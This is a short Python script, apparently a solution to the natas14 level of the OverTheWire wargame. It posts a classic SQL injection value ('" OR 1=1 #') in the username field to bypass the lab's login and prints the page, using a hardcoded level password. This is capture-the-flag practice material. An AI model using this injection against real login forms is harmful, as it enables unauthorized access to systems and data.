#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

import re
import requests

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth=(username, password))
response = session.post(url, data={"username": 'please" OR 1=1 #',
                                   "password": "subscribe"}, auth=(username, password))
content = response.text
print(content)
